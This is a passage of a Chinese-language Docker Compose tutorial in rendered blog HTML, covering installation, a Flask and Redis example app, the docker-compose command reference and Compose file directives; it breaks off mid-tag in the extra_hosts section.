-m`</span> &gt; <span class="regexp">/usr/local</span><span class="regexp">/bin/docker</span>-compose</span><br><span class="line">$ sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>通常也可以通过apt-get包管理安装docker-compose 不同的发行版本不一样，具体请参考官方文档</p><p><strong>卸载</strong></p><p>如果是二进制包方式安装的，删除二进制文件即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo rm /usr/<span class="built_in">local</span>/bin/docker-compose</span></span><br></pre></td></tr></table></figure><p>如果是通过 pip 安装的，则执行如下命令即可删除。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo pip uninstall docker-compose</span></span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>术语</strong></p><p>首先介绍几个术语。</p><ul><li><p>服务 (service)：一个应用容器，实际上可以运行多个相同镜像的实例。</p></li><li><p>项目 (project)：由一组关联的应用容器组成的一个完整业务单元。</p></li></ul><p>可见，一个项目可以由多个服务（容器）关联而成，Compose 面向项目进行管理。</p><p><strong>场景</strong></p><p>最常见的项目是 web 网站，该项目应该包含 web 应用和缓存。</p><p>下面我们用 Python 来建立一个能够记录页面访问次数的 web 网站。</p><p><strong>web 应用</strong></p><p>新建文件夹，在该目录中编写 app.py 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=<span class="string">'redis'</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    count = redis.incr(<span class="string">'hits'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! 该页面已被访问 &#123;&#125; 次。\n'</span>.format(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>Dockerfile</strong></p><p>编写 Dockerfile 文件，内容为</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.6</span>-alpine</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> . /code</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /code</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install redis flask</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"python"</span>, <span class="string">"app.py"</span>]</span></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><p>编写 docker-compose.yml 文件，这个是 Compose 使用的主模板文件。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">  web:</span></span><br><span class="line"><span class="symbol">    build:</span> .</span><br><span class="line"><span class="symbol">    ports:</span></span><br><span class="line">     - <span class="string">"5000:5000"</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">  redis:</span></span><br><span class="line"><span class="symbol">    image:</span> <span class="string">"redis:alpine"</span></span><br></pre></td></tr></table></figure><p><strong>运行 compose 项目</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker-compose up</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566386283941.png" alt></p><p>此时访问本地 5000 端口，每次刷新页面，计数就会加 1。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566386351404.png" alt></p><h3 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h3><p><strong>命令对象与格式</strong></p><p>对于 Compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。</p><p>执行 <code>docker-compose [COMMAND] --help</code> 或者 <code>docker-compose help [COMMAND]</code> 可以查看具体某个命令的使用格式。</p><p>docker-compose 命令的基本的使用格式是</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose <span class="comment">[-f=&lt;arg&gt;...]</span> <span class="comment">[options]</span> <span class="comment">[COMMAND]</span> <span class="comment">[ARGS...]</span></span><br></pre></td></tr></table></figure><p><strong>命令选项</strong></p><ul><li><p><code>-f, --file FILE</code> 指定使用的 Compose 模板文件，默认为 docker-compose.yml，可以多次指定。</p></li><li><p><code>-p, --project-name NAME</code> 指定项目名称，默认将使用所在目录名称作为项目名。</p></li><li><p><code>--x-networking</code> 使用 Docker 的可拔插网络后端特性</p></li><li><p><code>--x-network-driver DRIVER</code> 指定网络后端的驱动，默认为 bridge</p></li><li><p><code>--verbose</code> 输出更多调试信息。</p></li><li><p><code>-v, --version</code> 打印版本并退出。</p></li></ul><p><strong>命令使用说明</strong></p><p><code>build</code><br>格式为 <code>docker-compose build [options] [SERVICE...]。</code></p><p>构建（重新构建）项目中的服务容器。</p><p>服务容器一旦构建后，将会带上一个标记名，例如对于 web 项目中的一个 db 容器，可能是 web_db。</p><p>可以随时在项目目录下运行 docker-compose build 来重新构建服务。</p><p>选项包括：</p><p>选项包括：</p><ul><li><p>–force-rm 删除构建过程中的临时容器。</p></li><li><p>–no-cache 构建镜像过程中不使用 cache（这将加长构建过程）。</p></li><li><p>–pull 始终尝试通过 pull 来获取更新版本的镜像。</p></li></ul><p><strong>config</strong></p><p>验证 Compose 文件格式是否正确，若正确则显示配置，若格式错误显示错误原因</p><p><strong>down</strong></p><p>此命令将会停止 up 命令所启动的容器，并移除网络</p><p><strong>exec</strong></p><p>进入指定的容器。</p><p><strong>help</strong></p><p>获得一个命令的帮助。</p><p><strong>images</strong></p><p>列出 Compose 文件中包含的镜像。</p><p><strong>kill</strong></p><p>格式为 <code>docker-compose kill [options] [SERVICE...]</code>。</p><p>通过发送 SIGKILL 信号来强制停止服务容器。</p><p>支持通过 -s 参数来指定发送的信号，例如通过如下指令发送 SIGINT 信号。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker-compose <span class="built_in">kill</span> -s SIGINT</span></span><br></pre></td></tr></table></figure><p><strong>logs</strong></p><p>格式为 <code>docker-compose logs [options] [SERVICE...]</code>。</p><p>查看服务容器的输出。默认情况下，docker-compose 将对不同的服务输出使用不同的颜色来区分。可以通过 <code>--no-color</code> 来关闭颜色。</p><p>该命令在调试问题的时候十分有用。</p><p><strong>pause</strong></p><p>格式为 <code>docker-compose pause [SERVICE...]</code>。</p><p>暂停一个服务容器。</p><p><strong>port</strong></p><p>格式为 <code>docker-compose port [options] SERVICE PRIVATE_PORT</code>。</p><p>打印某个容器端口所映射的公共端口。</p><p>选项：</p><ul><li><p>–protocol=proto 指定端口协议，tcp（默认值）或者 udp。</p></li><li><p>–index=index 如果同一服务存在多个容器，指定命令对象容器的序号（默认为 1）。</p></li></ul><p><strong>ps</strong></p><p>格式为 <code>docker-compose ps [options] [SERVICE...]</code>。</p><p>列出项目中目前的所有容器。</p><p>选项：</p><ul><li>-q 只打印容器的 ID 信息。</li></ul><p><strong>pull</strong></p><p>格式为 <code>docker-compose pull [options] [SERVICE...]</code>。</p><p>拉取服务依赖的镜像。</p><p>选项：</p><ul><li>–ignore-pull-failures 忽略拉取镜像过程中的错误。</li></ul><p><strong>push</strong></p><p>推送服务依赖的镜像到 Docker 镜像仓库。</p><p><strong>restart</strong></p><p>格式为 <code>docker-compose restart [options] [SERVICE...]</code>。</p><p>重启项目中的服务。</p><p>选项：</p><ul><li>-t, –timeout TIMEOUT 指定重启前停止容器的超时（默认为 10 秒）。</li></ul><p><strong>rm</strong><br>格式为 <code>docker-compose rm [options] [SERVICE...]</code>。</p><p>删除所有（停止状态的）服务容器。推荐先执行 <code>docker-compose stop</code> 命令来停止容器。</p><p>选项：</p><ul><li><p>-f, –force 强制直接删除，包括非停止状态的容器。一般尽量不要使用该选项。</p></li><li><p>-v 删除容器所挂载的数据卷。</p></li></ul><p><strong>run</strong></p><p>格式为 <code>docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]</code>。</p><p>在指定服务上执行一个命令。</p><p>例如：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose <span class="built_in">run</span> ubuntu <span class="built_in">ping</span> docker.com</span><br></pre></td></tr></table></figure><p>将会启动一个 ubuntu 服务容器，并执行 ping docker.com 命令。</p><p>默认情况下，如果存在关联，则所有关联的服务将会自动被启动，除非这些服务已经在运行中。</p><p>该命令类似启动容器后运行指定的命令，相关卷、链接等等都将会按照配置自动创建。</p><p>两个不同点：</p><p>给定命令将会覆盖原有的自动运行命令；</p><p>不会自动创建端口，以避免冲突。</p><p>如果不希望自动启动关联的容器，可以使用 <code>--no-deps</code> 选项，例如</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose run --<span class="keyword">no</span>-deps web <span class="keyword">python</span> manage.<span class="keyword">py</span> <span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p>将不会启动 web 容器所关联的其它容器。</p><p>选项：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">d 后台运行容器。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--name NAME 为容器指定一个名字。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--entrypoint CMD 覆盖默认的容器启动指令。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-e KEY=VAL 设置环境变量值，可多次使用选项来设置多个环境变量。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-u, --user=<span class="string">""</span> 指定运行容器的用户名或者 uid。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-deps 不自动启动关联的服务容器。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--rm 运行命令后自动删除容器，d 模式下将忽略。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-p, --publish=[] 映射容器端口到本地主机。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--service-ports 配置服务端口并映射到本地主机。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-T 不分配伪 tty，意味着依赖 tty 的指令将无法运行。</span></span><br></pre></td></tr></table></figure><p><strong>scale</strong></p><p>格式为 <code>docker-compose scale [options] [SERVICE=NUM...]</code>。</p><p>设置指定服务运行的容器个数。</p><p>通过 service=num 的参数来设置数量。例如：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose scale web=<span class="number">3</span> db=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。</p><p>一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。</p><p>选项：</p><ul><li>-t, –timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。</li></ul><p><strong>start</strong></p><p>格式为 <code>docker-compose start [SERVICE...]</code>。</p><p>启动已经存在的服务容器。</p><p><strong>stop</strong></p><p>格式为 <code>docker-compose stop [options] [SERVICE...]</code>。</p><p>停止已经处于运行状态的容器，但不删除它。通过 docker-compose start 可以再次启动这些容器。</p><p>选项：</p><ul><li>-t, –timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。</li></ul><p><strong>top</strong></p><p>查看各个服务容器内运行的进程。</p><p><strong>unpause</strong></p><p>格式为 <code>docker-compose unpause [SERVICE...]</code>。</p><p>恢复处于暂停状态中的服务。</p><p><strong>up</strong></p><p>格式为 <code>docker-compose up [options] [SERVICE...]</code>。</p><p>该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。</p><p>链接的服务都将会被自动启动，除非已经处于运行状态。</p><p>可以说，大部分时候都可以直接通过该命令来启动一个项目。</p><p>默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。</p><p>当通过 Ctrl-C 停止命令时，所有容器将会停止。</p><p>如果使用 <code>docker-compose up -d</code>，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。</p><p>默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 docker-compose up –no-recreate。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 docker-compose up –no-deps -d &lt;SERVICE_NAME&gt; 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。</p><p>选项：</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">d 在后台运行服务容器。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-color 不使用颜色来区分不同的服务的控制台输出。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-deps 不启动服务所链接的容器。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--force-recreate 强制重新创建容器，不能与 --no-recreate 同时使用。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-recreate 如果容器已经存在了，则不重新创建，不能与 --force-recreate 同时使用。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-build 不自动构建缺失的服务镜像。</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-t, --timeout TIMEOUT 停止容器时候的超时（默认为 <span class="number">10</span> 秒）。</span></span><br></pre></td></tr></table></figure><p><strong>version</strong></p><p>格式为 <code>docker-compose version</code>。</p><p>打印版本信息。</p><h3 id="Compose模板文件"><a href="#Compose模板文件" class="headerlink" title="Compose模板文件"></a>Compose模板文件</h3><p>模板文件是使用 <code>Compose</code> 的核心，涉及到的指令关键字也比较多。但大家不用担心，这里面大部分指令跟 <code>docker run</code> 相关参数的含义都是类似的。</p><p>默认的模板文件名称为 <code>docker-compose.yml</code>，格式为 YAML 格式。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">examples/web</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:80"</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/data"</span></span><br></pre></td></tr></table></figure><p>注意每个服务都必须通过 <code>image</code> 指令指定镜像或 <code>build</code> 指令（需要 Dockerfile）等来自动构建生成镜像。</p><p>如果使用 <code>build</code> 指令，在 <code>Dockerfile</code> 中设置的选项(例如：<code>CMD</code>, <code>EXPOSE</code>, <code>VOLUME</code>, <code>ENV</code> 等) 将会自动被获取，无需在 <code>docker-compose.yml</code> 中再次设置。</p><p>下面分别介绍各个指令的用法。</p><p><code>build</code></p><p>指定 <code>Dockerfile</code> 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 <code>Compose</code> 将会利用它自动构建这个镜像，然后使用这个镜像。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure><p>你也可以使用 <code>context</code> 指令指定 <code>Dockerfile</code> 所在文件夹的路径。</p><p>使用 <code>dockerfile</code> 指令指定 <code>Dockerfile</code> 文件名。</p><p>使用 <code>arg</code> 指令指定构建镜像时的变量。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    build:</span></span><br><span class="line"><span class="attr">      context:</span> <span class="string">./dir</span></span><br><span class="line"><span class="attr">      dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line"><span class="attr">      args:</span></span><br><span class="line"><span class="attr">        buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>使用 <code>cache_from</code> 指定构建镜像的缓存</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span></span><br><span class="line"><span class="attr">  context:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">  cache_from:</span></span><br><span class="line"><span class="attr">    - alpine:</span><span class="string">latest</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">corp/web_app:3.14</span></span><br></pre></td></tr></table></figure><p><code>cap_add, cap_drop</code></p><p>指定容器的内核能力（capacity）分配。</p><p>例如，让容器拥有所有能力可以指定为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cap_add:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ALL</span></span><br></pre></td></tr></table></figure><p>去掉 NET_ADMIN 能力可以指定为：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cap_drop:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">NET_ADMIN</span></span><br></pre></td></tr></table></figure><p><code>command</code></p><p>覆盖容器启动后默认执行的命令。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="string">echo</span> <span class="string">"hello world"</span></span><br></pre></td></tr></table></figure><p><code>configs</code></p><p>仅用于 <code>Swarm mode</code>，详细内容请查看 <a href="../swarm_mode/"><code>Swarm mode</code></a> 一节。</p><p><code>cgroup_parent</code></p><p>指定父 <code>cgroup</code> 组，意味着将继承该组的资源限制。</p><p>例如，创建了一个 cgroup 组名称为 <code>cgroups_1</code>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cgroup_parent:</span> <span class="string">cgroups_1</span></span><br></pre></td></tr></table></figure><p><code>container_name</code></p><p>指定容器名称。默认将会使用 <code>项目名称_服务名称_序号</code> 这样的格式。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">container_name:</span> <span class="string">docker-web-container</span></span><br></pre></td></tr></table></figure><blockquote><p>注意: 指定容器名称后，该服务将无法进行扩展（scale），因为 Docker 不允许多个容器具有相同的名称。</p></blockquote><p><code>deploy</code></p><p>仅用于 <code>Swarm mode</code>，详细内容请查看 <a href="../swarm_mode/"><code>Swarm mode</code></a> 一节</p><p><code>devices</code></p><p>指定设备映射关系。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devices:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">"/dev/ttyUSB1:/dev/ttyUSB0"</span></span><br></pre></td></tr></table></figure><p><code>depends_on</code></p><p>解决容器的依赖、启动先后的问题。以下例子中会先启动 <code>redis</code> <code>db</code> 再启动 <code>web</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  web:</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">db</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  redis:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">redis</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  db:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">postgres</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>web</code> 服务不会等待 <code>redis</code> <code>db</code> 「完全启动」之后才启动。</p></blockquote><p><code>dns</code></p><p>自定义 <code>DNS</code> 服务器。可以是一个值，也可以是一个列表。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns:</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"><span class="bullet">  -</span> <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br></pre></td></tr></table></figure><p><code>dns_search</code></p><p>配置 <code>DNS</code> 搜索域。可以是一个值，也可以是一个列表。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">dns_search:</span> <span class="string">example.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dns_search:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">domain1.example.com</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">domain2.example.com</span></span><br></pre></td></tr></table></figure><p><code>tmpfs</code></p><p>挂载一个 tmpfs 文件系统到容器。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tmpfs:</span> <span class="string">/run</span></span><br><span class="line"><span class="attr">tmpfs:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">/run</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">/tmp</span></span><br></pre></td></tr></table></figure><p><code>env_file</code></p><p>从文件中获取环境变量，可以为单独的文件路径或列表。</p><p>如果通过 <code>docker-compose -f FILE</code> 方式来指定 Compose 模板文件，则 <code>env_file</code> 中变量的路径会基于模板文件路径。</p><p>如果有变量名称与 <code>environment</code> 指令冲突，则按照惯例，以后者为准。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">env_file: .env</span><br><span class="line"></span><br><span class="line">env_file:</span><br><span class="line">  - ./common.env</span><br><span class="line">  - ./apps/web.env</span><br><span class="line">  - /opt/secrets.env</span><br></pre></td></tr></table></figure><p>环境变量文件中每一行必须符合格式，支持 <code>#</code> 开头的注释行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># common.env: Set development environment</span></span><br><span class="line">PROG_ENV=development</span><br></pre></td></tr></table></figure><p><code>environment</code></p><p>设置环境变量。你可以使用数组或字典两种格式。</p><p>只给定名称的变量会自动获取运行 Compose 主机上对应变量的值，可以用来防止泄露不必要的数据。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="attr">  RACK_ENV:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">  SESSION_SECRET:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">RACK_ENV=development</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">SESSION_SECRET</span></span><br></pre></td></tr></table></figure><p>如果变量名称或者值中用到 <code>true|false，yes|no</code> 等表达 <a href="https://yaml.org/type/bool.html" target="_blank" rel="noopener">布尔</a> 含义的词汇，最好放到引号里，避免 YAML 自动解析某些内容为对应的布尔语义。这些特定词汇，包括</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y|Y|yes|Yes|YES|n|N|no|No|NO|<span class="literal">true</span>|True|TRUE|<span class="literal">false</span>|False|FALSE|on|On|ON|off|Off|OFF</span><br></pre></td></tr></table></figure><p><code>expose</code></p><p>暴露端口，但不映射到宿主机，只被连接的服务访问。</p><p>仅可以指定内部端口为参数</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">expose:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"3000"</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">"8000"</span></span><br></pre></td></tr></table></figure><p><code>external_links</code></p><blockquote><p>注意：不建议使用该指令。</p></blockquote><p>链接到 <code>docker-compose.yml</code> 外部的容器，甚至并非 <code>Compose</code> 管理的外部容器。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">external_links:</span></span><br><span class="line"><span class="bullet"> -</span> <span class="string">redis_1</span></span><br><span class="line"><span class="attr"> - project_db_1:</span><span class="string">mysql</span></span><br><span class="line"><span class="attr"> - project_db_1:</span><span class="string">postgresql</span></span><br></pre></td></tr></table></figure><p><code>extra_hosts</code></p><p>类似 Docker 中的 <code>--add-host</code> 参数，指定额外的 host 名称映射信息。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extra_hosts:</span></span><br><span class="line"><span class="bullet"> -</span> <span 